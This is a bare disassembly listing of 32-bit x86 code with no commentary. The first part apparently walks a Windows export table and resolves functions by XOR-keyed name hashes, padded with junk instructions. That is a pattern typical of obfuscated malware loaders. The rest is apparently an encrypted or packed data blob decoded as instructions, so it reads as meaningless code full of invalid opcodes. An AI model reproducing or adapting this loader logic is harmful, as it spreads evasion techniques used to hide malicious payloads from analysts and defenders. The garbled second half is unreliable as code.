  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x4239c2
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	push   0x45
  40635c:	mov    esi,0x623b3812
  406361:	bound  edx,QWORD PTR [eax]
  406363:	pop    edi
  406364:	bound  esp,QWORD PTR [edx-0x16]
  406367:	pop    esp
  406368:	inc    esi
  406369:	repz sahf 
  40636b:	or     DWORD PTR [ebp+ebx*2-0x2c],ebx
  40636f:	fisttp DWORD PTR [ecx-0x4a]
  406372:	jno    0x4063b4
  406374:	pop    ebx
  406375:	out    dx,eax
  406376:	mov    esp,0x1e9ba273
  40637b:	adc    esp,DWORD PTR [ecx+edi*2-0x1d00bc2]
  406382:	test   eax,ebp
  406384:	jl     0x406389
  406386:	cmp    eax,0xaf2b214
  40638b:	adc    cl,al
  40638d:	and    dh,dl
  40638f:	imul   ah
  406391:	push   esi
  406392:	cs jmp 0x6e5d:0xf11ea69f
  40639a:	sub    al,0xbc
  40639c:	push   esi
  40639d:	fdivr  QWORD PTR [ebp+0x79eeff74]
  4063a3:	sub    eax,0x338a0d32
  4063a8:	loope  0x4063a4
  4063aa:	sbb    BYTE PTR ss:[ecx-0x5f],0xab
  4063af:	je     0x4063fe
  4063b1:	inc    esi
  4063b2:	cmp    DWORD PTR [edx],0x392a5a26
  4063b8:	call   0x1dbad38d
  4063bd:	sub    DWORD PTR [eax],esi
  4063bf:	mov    edx,0x1c12c1da
  4063c4:	dec    ecx
  4063c5:	inc    ebp
  4063c6:	jp     0x406410
  4063c8:	cmp    eax,0xf7406567
  4063cd:	test   BYTE PTR [edi-0x6eb7929f],0x62
  4063d4:	jno    0x4063c2
  4063d6:	mov    ss:0xb92a8a41,al
  4063dc:	pop    es
  4063dd:	xor    ch,BYTE PTR [ecx]
  4063df:	or     bl,BYTE PTR [esi+0x409da45b]
  4063e5:	frstor [eax]
  4063e7:	jo     0x40638a
  4063e9:	jnp    0x4063ad
  4063eb:	mov    cl,0x12
  4063ed:	aas    
  4063ee:	aad    0x21
  4063f0:	cmc    
  4063f1:	xor    edi,DWORD PTR [ebp-0x6cbc1c37]
  4063f7:	jl     0x406419
  4063f9:	push   0x3806519a
  4063fe:	(bad)  
  4063ff:	cwde   
  406400:	dec    edx
  406401:	stos   BYTE PTR es:[edi],al
  406402:	pop    esi
  406403:	pop    edx
  406404:	sahf   
  406405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406406:	mov    edi,fs
  406408:	dec    edi
  406409:	adc    BYTE PTR [esi+0x40],bl
  40640c:	dec    edi
  40640d:	xchg   BYTE PTR [eax-0x421f2a9e],bh
  406413:	jno    0x40642c
  406415:	sbb    cl,BYTE PTR [bp+di+0x43]
  406419:	lahf   
  40641a:	inc    eax
  40641b:	sub    al,0xc4
  40641d:	test   al,0x7f
  40641f:	pushf  
  406420:	fild   QWORD PTR [ebp+0x1d]
  406423:	es and al,0x74
  406426:	(bad)  
  406427:	outs   dx,DWORD PTR ds:[esi]
  406428:	fwait
  406429:	es sub al,0x64
  40642c:	inc    esp
  40642d:	adc    al,0x7b
  40642f:	cmc    
  406430:	cwde   
  406431:	inc    esi
  406432:	mov    BYTE PTR ds:[ebp+ebx*2-0x30d0d9b7],cl
  40643a:	sbb    edx,edi
  40643c:	clc    
  40643d:	jo     0x40642f
  40643f:	jns    0x4064b8
  406441:	retf   
  406442:	shl    ebx,1
  406444:	mov    ebp,0x7683845a
  406449:	sub    BYTE PTR [eax-0x64b9945a],0x91
  406450:	(bad)  
  406451:	in     eax,dx
  406452:	mov    esi,0x2aa4a32
  406457:	mov    bh,0x80
  406459:	stc    
  40645a:	sbb    eax,0xad173d08
  40645f:	sub    al,0xae
  406461:	push   ss
  406462:	hlt    
  406463:	or     edi,DWORD PTR [eax-0x46681779]
  406469:	retf   0xaaa7
  40646c:	push   ss
  40646d:	fnstsw WORD PTR [edi+ebp*1-0x7f107627]
  406474:	or     ecx,DWORD PTR [ebx]
  406476:	retf   
  406477:	iret   
  406478:	cmp    BYTE PTR [edx-0x3c3a3be8],0x7f
  40647f:	or     ebp,esp
  406481:	in     eax,0xcf
  406483:	pop    ecx
  406484:	bound  ecx,QWORD PTR [ebx+0x2]
  406487:	pushf  
  406488:	cdq    
  406489:	ins    DWORD PTR es:[edi],dx
  40648a:	push   edx
  40648b:	pop    ebp
  40648c:	(bad)  
  40648e:	es gs push ecx
  406491:	stos   DWORD PTR es:[edi],eax
  406492:	pop    eax
  406493:	xchg   ebx,eax
  406494:	pop    edx
  406495:	push   ebp
  406496:	sbb    eax,0x48fba5e7
  40649b:	push   es
  40649c:	mov    edi,0xd69d5385
  4064a1:	mov    ebp,0x8c4f54a2
  4064a6:	push   es
  4064a7:	ret    
  4064a8:	push   ss
  4064a9:	pop    edx
  4064aa:	adc    al,al
  4064ac:	jnp    0x406500
  4064ae:	test   eax,0xb2cfca4c
  4064b3:	cdq    
  4064b4:	mov    ah,0x1e
  4064b6:	xor    BYTE PTR [ebx-0x7f],ah
  4064b9:	lods   al,BYTE PTR ds:[esi]
  4064ba:	or     ax,0x1a37
  4064be:	dec    edx
  4064bf:	sub    al,0xf0
  4064c1:	data16 das 
  4064c3:	loope  0x4064e3
  4064c5:	fisttp QWORD PTR [ecx+edi*8+0x79398f04]
  4064cc:	cs (bad) 
  4064ce:	jl     0x4064b0
  4064d0:	clc    
  4064d1:	or     al,0xb7
  4064d3:	pop    ecx
  4064d4:	scas   eax,DWORD PTR es:[edi]
  4064d5:	or     eax,0xc0db9397
  4064da:	or     BYTE PTR [edi-0x45678097],dl
  4064e0:	mov    ebx,DWORD PTR [ebp-0x20a18518]
  4064e6:	and    edi,DWORD PTR [edx]
  4064e8:	popf   
  4064e9:	jno    0x406553
  4064eb:	inc    ecx
  4064ec:	and    BYTE PTR [ecx],bh
  4064ee:	or     bh,ch
  4064f0:	xchg   ecx,eax
  4064f1:	pop    esp
  4064f2:	fnstenv [edx]
  4064f4:	(bad)  
  4064f5:	out    0xf8,al
  4064f7:	(bad)  
  4064f9:	inc    eax
  4064fa:	push   ss
  4064fb:	cdq    
  4064fc:	shl    DWORD PTR [esi+ebx*4-0x5a],1
  406500:	imul   ecx,esp,0x36e276d
  406506:	sahf   
  406507:	out    0x3,al
  406509:	xor    edx,DWORD PTR [ecx-0x54]
  40650c:	(bad)  
  40650d:	outs   dx,DWORD PTR ds:[esi]
  40650e:	mov    bl,BYTE PTR [ebp+0x51]
  406511:	stos   DWORD PTR es:[edi],eax
  406512:	retf   
  406513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406514:	xchg   edx,eax
  406515:	push   0xc0d87214
  40651a:	bound  esp,QWORD PTR [eax+ebp*4+0x6d22486e]
  406521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406522:	push   edi
  406523:	xchg   BYTE PTR [esp+edx*2],al
  406526:	mov    al,ds:0xc9d2bceb
  40652b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40652c:	push   ss
  40652d:	xor    eax,DWORD PTR [ecx]
  40652f:	pop    ds
  406530:	mov    edi,0x690fcd60
  406535:	or     ebx,DWORD PTR [ecx]
  406537:	jle    0x406568
  406539:	jne    0x406576
  40653b:	add    eax,0xf7d83a66
  406540:	or     eax,0xb0ddbd94
  406545:	mov    edi,es
  406547:	xor    ecx,DWORD PTR [ecx]
  406549:	imul   eax,DWORD PTR [eax],0x63703b0d
  40654f:	jnp    0x40653b
  406551:	lods   al,BYTE PTR ds:[esi]
  406552:	jno    0x4064f7
  406554:	shl    BYTE PTR [edx],0xe2
  406557:	(bad)  
  406558:	or     edi,esi
  40655a:	or     ch,dl
  40655c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40655d:	test   eax,0xb4cb6472
  406562:	mov    dl,0xe1
  406564:	jo     0x406589
  406566:	mov    DWORD PTR [edx],edi
  406568:	mov    eax,ds:0x9d8df37e
  40656d:	mov    ds:0x61d7cbdd,eax
  406572:	xor    DWORD PTR [edx+0x3e0b363b],edx
  406578:	outs   dx,BYTE PTR ds:[esi]
  406579:	sahf   
  40657a:	jne    0x40651d
  40657c:	aam    0xc2
  40657e:	gs (bad) 
  406580:	cmp    edx,DWORD PTR [ebx-0x45d9b1f0]
  406586:	lahf   
  406587:	nop
  406588:	fstp   DWORD PTR ds:0xe8dc6263
  40658e:	sub    BYTE PTR ds:0x713590f4,bh
  406594:	dec    edx
  406595:	dec    esp
  406596:	mov    esp,0xbbd92707
  40659b:	mov    bl,0x16
  40659d:	push   0x40
  40659f:	or     DWORD PTR [esi+0x6293b01a],esp
  4065a5:	mov    ecx,0xb4f3cc54
  4065aa:	fimul  DWORD PTR [ebp-0x52]
  4065ad:	push   eax
  4065ae:	pushf  
  4065af:	fistp  QWORD PTR ds:0x3e5bfcba
  4065b5:	loopne 0x4065da
  4065b7:	cld    
  4065b8:	sub    eax,0xb4e9b10b
  4065bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065be:	dec    esp
  4065bf:	dec    eax
  4065c0:	iret   
  4065c1:	ret    
  4065c2:	mov    eax,ds:0x33fad152
  4065c7:	test   BYTE PTR [ebx],0xb7
  4065ca:	les    edi,FWORD PTR [edx-0x57]
  4065cd:	test   al,0xa9
  4065cf:	hlt    
  4065d0:	lds    ebp,FWORD PTR [esi]
  4065d2:	lock inc ebx
  4065d4:	sbb    al,0xc6
  4065d6:	xlat   BYTE PTR ds:[ebx]
  4065d7:	xchg   esi,eax
  4065d8:	jnp    0x406587
  4065da:	sub    bh,dl
  4065dc:	inc    ecx
  4065dd:	je     0x406597
  4065df:	pop    esi
  4065e0:	xchg   edx,eax
  4065e1:	adc    edx,DWORD PTR [eax]
  4065e3:	outs   dx,BYTE PTR ds:[esi]
  4065e4:	ja     0x4065ef
  4065e6:	jae    0x406658
  4065e8:	mov    ah,bh
  4065ea:	dec    ebp
  4065eb:	ds leave 
  4065ed:	inc    esi
  4065ee:	or     DWORD PTR [eax+ecx*4+0x1e],ebx
  4065f2:	adc    eax,0x780a45ee
  4065f7:	les    edi,FWORD PTR [edx-0x63]
  4065fa:	sbb    al,0xa8
  4065fc:	js     0x40666b
  4065fe:	sbb    al,0xde
  406600:	xchg   ebp,eax
  406601:	lods   eax,DWORD PTR ds:[si]
  406603:	inc    ecx
  406604:	ins    DWORD PTR es:[edi],dx
  406605:	mov    dh,BYTE PTR [eax+ecx*4]
  406608:	push   ds
  406609:	mov    ch,0x59
  40660b:	es sbb eax,0x2c95206b
  406611:	xchg   esi,eax
  406612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406613:	fwait
  406614:	and    BYTE PTR [eax],0xaf
  406617:	out    dx,al
  406618:	call   0xb7fb00cc
  40661d:	cmp    edi,esi
  40661f:	push   cs
  406620:	and    DWORD PTR [ecx+0x4ae3a071],ebx
  406626:	adc    al,0x2f
  406628:	push   es
  406629:	mov    edx,0xfa7891e0
  40662e:	add    DWORD PTR [edx+0x480dc842],edx
  406634:	(bad)  
  406636:	mov    ecx,0xc17f16d9
  40663b:	inc    edx
  40663c:	jg     0x4065e6
  40663e:	sub    al,0x99
  406640:	cmp    BYTE PTR [esi+0x57e51f5f],al
  406646:	or     dh,BYTE PTR [edi+esi*2+0x7d97c680]
  40664d:	mov    esi,0xf04d40d5
  406652:	cmp    esp,DWORD PTR [edi]
  406654:	pop    ds
  406655:	mov    dh,0x99
  406657:	mov    ds:0x9c3b9bb0,eax
  40665c:	push   eax
  40665d:	mov    edx,0x13e267c9
  406662:	or     BYTE PTR [esi],bh
  406664:	(bad)  
  406665:	rcr    DWORD PTR [ebp+edx*8+0x297ed9ae],0xbd
  40666d:	imul   eax,ebx,0xbdf3a961
  406673:	dec    edi
  406674:	and    al,0x4a
  406676:	push   ebx
  406677:	shl    BYTE PTR [esi-0x282fd554],1
  40667d:	in     eax,dx
  40667e:	scas   eax,DWORD PTR es:[edi]
  40667f:	or     bl,dh
  406681:	jl     0x406621
  406683:	xchg   esp,eax
  406684:	sbb    al,bh
  406686:	sub    al,0xf7
  406688:	cli    
  406689:	js     0x406662
  40668b:	fsub   st,st(5)
  40668d:	pop    edi
  40668e:	push   0xffffff9b
  406690:	push   ecx
  406691:	xlat   BYTE PTR ds:[ebx]
  406692:	ds jns 0x40662c
  406695:	adc    esp,DWORD PTR [esi]
  406697:	jl     0x4066dc
  406699:	out    0xc1,al
  40669b:	adc    esp,eax
  40669d:	arpl   WORD PTR [edx-0x598c77ef],cx
  4066a3:	pop    ecx
  4066a4:	xor    BYTE PTR [eax-0x75d09fb6],dh
  4066aa:	push   0x66
  4066ac:	cmp    DWORD PTR [ebx-0x6a],ebp
  4066af:	ret    
  4066b0:	xor    al,0x3c
  4066b2:	sbb    BYTE PTR [esi-0x2ecb6c63],al
  4066b8:	out    0x7d,eax
  4066ba:	call   0x19ff5e85
  4066bf:	mov    ebx,DWORD PTR [ebp+0x6c]
  4066c2:	xchg   dl,cl
  4066c4:	das    
  4066c5:	out    0xe8,eax
  4066c7:	mov    dl,0x53
  4066c9:	out    0xde,al
  4066cb:	fadd   QWORD PTR [edi]
  4066cd:	aas    
  4066ce:	scas   al,BYTE PTR es:[edi]
  4066cf:	xchg   edx,eax
  4066d0:	shr    BYTE PTR [esi-0x2f],0x35
  4066d4:	mov    cl,BYTE PTR gs:[edi]
  4066d7:	out    0x7e,al
  4066d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066da:	jne    0x40665e
  4066dc:	ss in  al,0xf4
  4066df:	clc    
  4066e0:	push   ds
  4066e1:	test   DWORD PTR [esi-0x7e],0x44b72e1
  4066e8:	aad    0x81
  4066ea:	adc    bh,BYTE PTR [edx+0x11]
  4066ed:	jle    0x4066a0
  4066ef:	mov    BYTE PTR [ecx+0x58],ch
  4066f2:	scas   eax,DWORD PTR es:[edi]
  4066f3:	clc    
  4066f4:	mov    eax,0xdf16aafa
  4066f9:	lods   eax,DWORD PTR ds:[esi]
  4066fa:	jb     0x40668d
  4066fc:	(bad)  
  4066fe:	into   
  4066ff:	dec    ebp
  406700:	mov    esi,0x4a841633
  406705:	xor    esi,DWORD PTR [edx+0x55]
  406708:	sbb    DWORD PTR ds:0xa508dfcc,esi
  40670e:	adc    dl,0xd4
  406711:	push   ds
  406712:	xor    eax,ebx
  406714:	mov    ebx,0x68e33aa1
  406719:	sar    BYTE PTR [eax+0x29],cl
  40671c:	imul   ebp,esp,0x2a
  40671f:	jmp    0x7ca1:0xd9417430
  406726:	enter  0x844,0xe1
  40672a:	mov    edx,0x69e367c9
  40672f:	ror    DWORD PTR [esi-0x3f],cl
  406732:	jmp    0xd02acbc8
  406737:	mov    DWORD PTR [edi+0x79],ebx
  40673a:	fnstenv [edi-0x9646b9]
  406740:	cmp    ecx,DWORD PTR [eax-0x4a487a00]
  406746:	jmp    0x6ee067af
  40674b:	mov    ecx,0x2a34f81b
  406750:	dec    edi
  406751:	xor    DWORD PTR [ebx+0x20121da0],ebx
  406757:	adc    ecx,DWORD PTR [esp+ebx*2+0x55]
  40675b:	ins    BYTE PTR es:[edi],dx
  40675c:	pop    edx
  40675d:	sub    al,0xd3
  40675f:	bound  ebp,QWORD PTR [eax-0x40025e89]
  406765:	jmp    0x5626:0x1a67e942
  40676c:	lea    eax,[esi+0x37]
  40676f:	loop   0x406708
  406771:	ret    0x701
  406774:	adc    ebp,DWORD PTR [ebx+eiz*1-0x15b56816]
  40677b:	imul   esp,DWORD PTR [ebx],0xffffffda
  40677e:	cmp    al,0xbe
  406780:	dec    esi
  406781:	shl    DWORD PTR [ecx+0x67eb1ed2],1
  406787:	scas   eax,DWORD PTR es:[edi]
  406788:	add    bh,ah
  40678a:	push   edx
  40678b:	jb     0x406806
  40678d:	push   0xffffffd5
  40678f:	jbe    0x40675a
  406791:	ss dec esp
  406793:	pop    ss
  406794:	mov    eax,ds:0x25263dd7
  406799:	adc    DWORD PTR [edx-0x4e7eaa11],esp
  40679f:	inc    esp
  4067a0:	rcl    DWORD PTR [edi],cl
  4067a2:	neg    BYTE PTR [edx+0x38]
  4067a5:	ss aam 0x68
  4067a8:	rcl    DWORD PTR [ebp+0x63ec5bd1],0x5
  4067af:	shl    BYTE PTR [esi],0xde
  4067b2:	repnz in eax,0x42
  4067b5:	int3   
  4067b6:	ja     0x4067cd
  4067b8:	(bad)  
  4067b9:	stos   DWORD PTR es:[edi],eax
  4067ba:	inc    edx
  4067bb:	xor    ebp,0xffffffb8
  4067be:	dec    ecx
  4067bf:	(bad)  
  4067c0:	jno    0x40676b
  4067c2:	and    eax,0x83998685
  4067c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067c8:	arpl   sp,dx
  4067ca:	jae    0x40679b
  4067cc:	mov    ss,WORD PTR [edi-0x3]
  4067cf:	jnp    0x4067fb
  4067d1:	xor    DWORD PTR [esi-0xd5c7837],edx
  4067d7:	or     ebx,DWORD PTR [edi]
  4067d9:	mov    al,ds:0xe2421f2
  4067de:	push   edx
  4067df:	imul   edi,DWORD PTR [edi-0x37],0x5a
  4067e3:	out    0x6,al
  4067e5:	adc    DWORD PTR [ecx+0x5d7234e0],0xe5a70d2
  4067ef:	shl    BYTE PTR [esi-0x5dc241b2],0xf7
  4067f6:	jp     0x4067c3
  4067f8:	loope  0x406855
  4067fa:	xchg   ecx,eax
  4067fb:	shl    ecx,1
  4067fd:	outs   dx,BYTE PTR ds:[esi]
  4067fe:	fwait
  4067ff:	test   eax,0xb4fc95d1
  406804:	stc    
  406805:	data16 sti 
  406807:	outs   dx,DWORD PTR ds:[esi]
  406808:	mov    ebp,0x567b65df
  40680d:	lods   eax,DWORD PTR ds:[esi]
  40680e:	scas   eax,DWORD PTR es:[edi]
  40680f:	(bad)  
  406810:	pop    eax
  406811:	les    edi,FWORD PTR [edi]
  406813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406814:	call   0x943cfc7c
  406819:	out    dx,eax
  40681a:	fisubr WORD PTR [eax]
  40681c:	mov    ch,ch
  40681e:	leave  
  40681f:	add    BYTE PTR [ebx+eax*2],ch
  406822:	sar    esp,1
  406824:	jle    0x406838
  406826:	gs int3 
  406828:	cli    
  406829:	retf   0x1857
  40682c:	or     al,0xa5
  40682e:	int    0x37
  406830:	push   ecx
  406831:	pop    esp
  406832:	rcl    BYTE PTR [edi+esi*2],1
  406835:	push   gs
  406837:	sub    esp,DWORD PTR [edx]
  406839:	pop    esi
  40683a:	mov    cl,0xe2
  40683c:	xchg   ebp,eax
  40683d:	iret   
  40683e:	stos   BYTE PTR es:[edi],al
  40683f:	ret    
  406840:	int3   
  406841:	daa    
  406842:	push   0xdd23ee4a
  406847:	sub    al,0x46
  406849:	and    eax,0xed92d2ae
  40684e:	jmp    0x2570:0x9c43a375
  406855:	pop    edx
  406856:	stos   BYTE PTR es:[edi],al
  406857:	ins    DWORD PTR es:[edi],dx
  406858:	and    DWORD PTR [edi+0x30329454],esi
  40685e:	out    dx,al
  40685f:	xchg   edx,eax
  406860:	aad    0x8b
  406862:	rcl    BYTE PTR [edi+0x72f6366c],cl
  406868:	dec    ecx
  406869:	sbb    DWORD PTR [edx+0x61a9213f],0x98132fd2
  406873:	adc    al,0x88
  406875:	jae    0x4068d2
  406877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406878:	push   0x1b07c0a0
  40687d:	adc    DWORD PTR [eax+0x4f],ebp
  406880:	jns    0x4068fd
  406882:	cwde   
  406883:	mov    esp,0x8a91921c
  406888:	jnp    0x406848
  40688a:	adc    DWORD PTR [ecx+0xbb77088],0xd44411e6
  406894:	cmp    al,0xb1
  406896:	mov    ah,0xfa
  406898:	or     al,0x3c
  40689a:	and    al,0x9e
  40689c:	and    ch,al
  40689e:	arpl   bp,si
  4068a0:	xchg   ecx,eax
  4068a1:	pop    ss
  4068a2:	mov    BYTE PTR [ecx+edi*2],cl
  4068a5:	add    bl,BYTE PTR [ecx-0x58abc673]
  4068ab:	push   ecx
  4068ac:	inc    edx
  4068ad:	xor    ah,BYTE PTR [ecx]
  4068af:	add    BYTE PTR ds:0x28738250,0xc6
  4068b6:	gs aam 0x6d
  4068b9:	int    0x73
  4068bb:	mov    edi,0x6ee96035
  4068c0:	aam    0x7f
  4068c2:	mov    cl,0xfc
  4068c4:	das    
  4068c5:	mov    edi,ecx
  4068c7:	push   0x7b
  4068c9:	call   0x9615ed57
  4068ce:	adc    BYTE PTR [ebx+0x4b9ec229],ch
  4068d4:	push   es
  4068d5:	xchg   esi,eax
  4068d6:	sbb    BYTE PTR ds:0xb23e8283,ah
  4068dc:	das    
  4068dd:	(bad)  
  4068de:	jp     0x406879
  4068e0:	pop    ds
  4068e1:	jl     0x4068f0
  4068e3:	adc    DWORD PTR [esi],esi
  4068e5:	push   edx
  4068e6:	out    0x2c,al
  4068e8:	sub    BYTE PTR [ecx-0x762d821c],cl
  4068ee:	in     eax,0x7f
  4068f0:	dec    ecx
  4068f1:	inc    esi
  4068f3:	adc    DWORD PTR [esi+0x1021b086],ebp
  4068f9:	pop    esp
  4068fa:	adc    ecx,ecx
  4068fc:	test   eax,0x219a7de4
  406901:	jo     0x4068f9
  406903:	int    0xfb
  406905:	ror    BYTE PTR [ebx+0x4],1
  406908:	sub    ebx,edx
  40690a:	jno    0x406952
  40690c:	sahf   
  40690d:	scas   eax,DWORD PTR es:[edi]
  40690e:	dec    edi
  40690f:	icebp  
  406910:	imul   bl
  406912:	xor    al,0x55
  406914:	push   cs
  406915:	hlt    
  406916:	stos   BYTE PTR es:[edi],al
  406917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406918:	les    esp,FWORD PTR ds:0x734a7673
  40691e:	nop
  40691f:	out    0x18,al
  406921:	mov    ebp,0xa220cc5f
  406926:	gs call 0xeb01:0x7db5ee11
  40692e:	xchg   edi,eax
  40692f:	xor    esi,eax
  406931:	xor    ebp,DWORD PTR [esp+edx*8]
  406934:	xor    al,0xe2
  406936:	retf   
  406937:	add    ah,BYTE PTR [ebp+0x5f1d86d2]
  40693d:	sub    dh,BYTE PTR [ecx-0x34]
  406940:	sbb    ebp,esp
  406942:	cwde   
  406943:	push   edi
  406944:	frstor [ebp+0x7f9bb3f0]
  40694a:	test   DWORD PTR [esi+0x1b],ebx
  40694d:	sti    
  40694e:	stc    
  40694f:	adc    al,0xcf
  406951:	mov    ecx,0xbbcdc33a
  406956:	retf   
  406957:	out    0x59,al
  406959:	mov    dl,0xc3
  40695b:	jno    0x406901
  40695d:	inc    esi
  40695e:	cli    
  40695f:	pop    esi
  406960:	push   esi
  406961:	add    esi,DWORD PTR [ecx+0x23d2bfad]
  406967:	mov    dh,0x2f
  406969:	add    dh,BYTE PTR [ebp+0x246517a3]
  40696f:	cmp    dl,bh
  406971:	ret    
  406972:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406973:	enter  0xe86e,0x35
  406977:	(bad)
  40697a:	data16 jb 0x40694e
  40697d:	icebp  
  40697e:	mov    BYTE PTR [edx-0x58759ce8],al
  406984:	adc    edi,DWORD PTR [ebx+0x38eccd75]
  40698a:	cwde   
  40698b:	repz and DWORD PTR [edi-0x6cbccb83],edx
  406992:	or     al,0x73
  406994:	clc    
  406995:	sub    ah,BYTE PTR [esi]
  406997:	push   ss
  406998:	jbe    0x406971
  40699a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40699b:	add    eax,0xc93f77da
  4069a0:	sub    BYTE PTR [ebx],bl
  4069a2:	xor    BYTE PTR [ecx+0x4f9faa2b],cl
  4069a8:	(bad)  
  4069a9:	repnz nop
  4069ab:	lea    edi,[esi-0x6dd23b5c]
  4069b1:	and    BYTE PTR ss:[edi+0x78],0x33
  4069b6:	cld    
  4069b7:	push   ss
